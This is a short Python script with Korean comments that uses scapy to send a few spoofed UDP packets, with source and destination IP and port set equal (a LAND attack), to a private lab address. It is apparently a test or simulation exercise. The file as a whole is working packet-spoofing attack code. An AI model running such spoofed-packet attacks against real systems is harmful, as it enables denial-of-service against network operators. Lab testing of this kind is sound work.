from scapy.all import IP, UDP, send # 💡 sendp 대신 send 임포트
import time

# --- 설정값 ---
TARGET_SERVER_IP = "172.20.0.2" 
TARGET_PORT = 5000 


def send_land_packets(target_ip, target_port, count=5):
    """LAND 공격 패킷을 전송 (L3 전송 강제)"""
    
    # 1. IP 헤더 위조: Source IP == Destination IP (서버 IP)
    ip_layer = IP(src=target_ip, dst=target_ip, ttl=64) 
    
    # 2. UDP 헤더 위조: Source Port == Destination Port (서버 포트)
    udp_layer = UDP(sport=target_port, dport=target_port)
    
    #  L2 헤더 (Ether()) 제거. L3 (IP) 계층부터 시작.
    payload = f"LAND-TEST-{time.time()}"
    packet = ip_layer / udp_layer / payload # 💡 Ether() 제거
    
    print(f"[*] Starting LAND-like Attack simulation on {target_ip}:{target_port}")
    print(f"[*] Sending {count} packets (Src/Dst: {target_ip}:{target_port})")

    for i in range(count):
        send(packet, verbose=False) 
        print(f"  - Sent packet {i+1}/{count}")
        time.sleep(0.5)

if __name__ == "__main__":
    send_land_packets(TARGET_SERVER_IP, TARGET_PORT, count=5)